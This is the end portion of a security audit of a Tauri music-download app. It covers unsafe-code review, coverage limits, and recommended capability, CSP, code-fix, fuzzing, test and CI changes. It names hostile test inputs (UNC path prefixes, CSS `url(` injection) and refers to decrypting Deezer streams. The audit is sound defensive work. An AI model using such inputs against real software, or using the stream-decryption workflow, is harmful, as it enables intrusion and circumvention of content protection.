| Capability "for the main window" implies what the UI needs | Grants dialog, process-restart, tray creation and window close/show/skip-taskbar that the UI never calls | W-05 |
| File grants: "Audio file has not been approved" implies nothing is touched before approval | `canonicalize` performs filesystem/network I/O first, and the error text differs by path state | W-02 |
| `save_settings` comment: "Allow non-auth settings updates" | Also accepts and persists an unverified ARL | W-20 |
| AGENTS.md: the `vergen` pin "Do not relax … without testing a clean `Cargo.lock`" | `Cargo.lock` is gitignored, so builds are not reproducible and the pin is the only guard | W-22 |
| Default folder layouts imply any track can be saved | Long names can never be saved, because the temp name exceeds 255 bytes | W-09 |
| `paths.rs` already uses `chars().take(4)` for the release year (multibyte-safe) | The tag writers slice the same field by bytes | W-01 |
| Deezer client: https-only, timeouts, capped bodies, host-checked pagination | The Spotify client has none of these | W-08 |

---

## 9. Unsafe inventory

`rg -n unsafe deezy/src-tauri/src deezy/src-tauri/build.rs`: 3 blocks; no `unsafe fn`, `unsafe impl`, `static mut`, raw-pointer arithmetic or `transmute`.

| # | Location | Code | cfg | Verdict | Reasoning |
|---|---|---|---|---|---|
| 1 | `paths.rs:322` | `unsafe { MoveFileExW(source_wide.as_ptr(), destination_wide.as_ptr(), 0) }` | `windows` | **Sound** | Both pointers come from live `Vec<u16>` buffers, NUL-terminated via `chain(Some(0))`, that outlive the call. The API only reads them. `flags = 0` (no replace) gives the no-clobber semantics. The BOOL is checked and `last_os_error` is read immediately. Caveats, not memory-safety issues: an interior U+0000 would truncate (unreachable, because std rejects such paths earlier); there is no `\\?\` prefix, so paths over MAX_PATH fail without long-path support. Reached only when hard links fail. |
| 2 | `settings.rs:386-392` | `unsafe { MoveFileExW(src, dst, MOVEFILE_REPLACE_EXISTING \| MOVEFILE_WRITE_THROUGH) }` | `windows` | **Sound** | Same buffer reasoning; the paths come from `app_data_dir`. See the Minor note on sharing violations. |
| 3 | `settings.rs:777` | `unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) }` | `unix`, `#[cfg(test)]` | **Sound** | `CString` guarantees termination and no interior NUL; the return value is asserted. Test-only. |

Related safe-but-platform-specific code was reviewed for correctness:
- `read_private`: unix `O_NOFOLLOW|O_CLOEXEC|O_NONBLOCK`; Windows symlink pre-check.
- `write_private`: unix `0600` + `O_NOFOLLOW` + directory fsync.
- `enforce_private_file`: unix `fchmod`.
- `rename_noclobber`: the unix race is W-10.

Dependency unsafe: see `cargo geiger` in §5 (no unusual crates; the bulk is tokio, windows-sys, wry/webview2-com and the crypto crates).

---

## 10. Coverage

| Area | Depth | By |
|---|---|---|
| All 37 Rust source files (~9.5k lines) | Read in full for panics, concurrency, unsafe, crypto and cleanup | robustness pass |
| All 60 IPC commands + capability/plugin surface | Each traced from argument to sink, with a hostile-argument harness | IPC pass |
| Frontend (`src/**`, built bundle) | Every sink, listener, store, `invoke`, CSP and config; ESLint; headless CSP experiment | frontend pass |
| Tauri internals relied on | `ipc/mod.rs` (async command execution), `manager/mod.rs` (CSP hashing), ACL manifests | read |
| Dependency behaviour relied on | librespot-oauth/core/audio/metadata 0.8.0, metaflac 0.2.8, tray-icon 0.23.1, reqwest 0.12.28 | read specific functions |
| Builds/tests/tooling | Everything in §4–§5 | run |

**Not covered / limits:**
- No live exploitation inside the running WebView (no WebDriver). A1 chains are argued from code and harnesses.
- macOS/Linux runtime behaviour was not executed: W-10, the Unix side of W-13 and W-17, and zombie processes.
- No coverage-guided fuzzing (cargo-fuzz). Property tests ran on copied pure functions only, not the in-tree code.
- Parser internals of librespot, lofty, id3, metaflac and keyring were reviewed only where a finding depended on them. The one malformed-FLAC experiment showed metaflac panics are contained by `spawn_blocking`.
- The installer/bundle (NSIS/WiX/DMG), code signing and auto-start were not reviewed. A full `tauri build` with bundling was not run; only `--no-bundle`.
- Deezer/Spotify server-side behaviour was not tested (no external contact): W-07 server effects, W-12 key availability, I-4, and the legacy-URL padding.
- The two `@sveltejs/kit` OSV advisories were not read in detail offline.
- `tests/*.test.mjs` were run but not reviewed for quality.

---

## 11. Recommendations

### Least-privilege capability (`capabilities/default.json`)
```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Capability for the main window",
  "windows": ["main"],
  "permissions": [
    "core:event:default",
    "core:window:allow-hide",
    "notification:default"
  ]
}
```
Drop `@tauri-apps/plugin-dialog` and `@tauri-apps/plugin-process` from `package.json`, and drop `tauri_plugin_process::init()` if unused. Verify in `tauri dev` and in a real build that `listen()`, `hide()` and notifications still work (add `core:app:default` only if something breaks).

### CSP and WebView
- Use the CSP from W-06 (`object-src`, `base-uri`, `form-action`, `frame-src`, `frame-ancestors`, `worker-src` set to `'none'`; explicit `script-src 'self'`). Optionally move `app.html:19`'s `style="display: contents"` into `app.css` and drop `'unsafe-inline'` in production (keep it in `devCsp`).
- Set `"freezePrototype": true`.
- Add the `on_navigation` guard and deny new windows.

### Code fixes, in order
1. W-01: add `date.get(..4)`, run the download in a spawned task with unconditional deregistration, add an RAII temp guard, and bound the `exit_app` wait.
2. W-02: reject non-`Disk` path prefixes before any I/O; use one uniform "not approved" error.
3. W-03: add a timeout and move the OAuth flow off the async workers; preferably use your own listener that validates `state`.
4. W-20/W-07: strip `arl` from `save_settings`; validate IDs (numeric / base62) at the command boundary.
5. W-08: give the Spotify client https-only, timeouts, capped bodies and a pagination host check.
6. W-04: use a strict colour regex and `style:background-color`.
7. W-09, W-11, W-13, W-14, W-18: the small one-line fixes listed in each finding.

### Fuzz / property targets
Add these as `cargo fuzz` targets or in-tree `proptest` tests:
- `sanitize_path_component` + `build_download_path` (Custom template): output stays under the base, no `.`/`..`, every component is at most N bytes (would catch W-09).
- `write_mp3_tags` / `write_flac_tags` field extraction from arbitrary `serde_json::Value` (would have caught W-01).
- `parse_deezer_url` and the Spotify link parser: arbitrary strings never panic, and only the expected hosts and kinds are accepted.
- `redact` / `strip_url_queries` / `mask_long_tokens`: no secret pattern survives; scheme-case insensitivity.
- `audio_start` / Spotify header handling over arbitrary byte prefixes.
- `Theme::validate` + `sanitize_theme_name`: only CSS colours pass; no device names.
- Deezer Blowfish chunk loop with arbitrary chunk boundaries (decrypt-every-3rd invariant).
- `utc_timestamp` (already passes for all `u64`; keep it as a regression test).

### Missing tests
- A command-level test that a panicking download task still removes its cancellation entry and temp file.
- `exit_app` with a stuck registration exits within the bound.
- `canonical_file` rejects `\\server\share\…`, `\\?\UNC\…` and `\\.\…`, and errors are identical for missing and present-but-ungranted files.
- `save_settings` with a non-empty `arl` does not change the keyring.
- Spotify `select_file` with only unsupported formats returns an error.
- `Settings::load` with out-of-range values normalises them.
- Frontend: theme colour values with `;` / `url(` are rejected; the `TagEditorModal` stale-result race.

### CI (none exists today)
Add `.github/workflows/ci.yml` running on Windows plus Ubuntu (and macOS if feasible):
- `bun install --frozen-lockfile`, `bun run check`, `npm test`, `bun audit --prod` (fail on high).
- `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings -W clippy::unwrap_used -W clippy::expect_used -W clippy::indexing_slicing -W clippy::string_slice` (scope the last few to non-test code via `#![cfg_attr(not(test), warn(...))]`), `cargo test`.
- `cargo deny check advisories bans sources licenses` with a reviewed `deny.toml` (documented ignores for `rsa` RUSTSEC-2023-0071 and unmaintained transitive crates).
- `osv-scanner --lockfile deezy/bun.lock --lockfile deezy/src-tauri/Cargo.lock` on a schedule.
- **Commit `Cargo.lock`** (remove `.gitignore:49`), and run Dependabot/Renovate for both lockfiles.
- Optionally run `npm run tauri -- build --debug --no-bundle` as a smoke build, and document `bun install` (not `npm install`) so untrusted postinstall scripts (es5-ext) stay disabled.
- Add `[profile.release] overflow-checks = true` if the small cost is acceptable; this turns silent wraps into contained errors in `spawn_blocking` code.
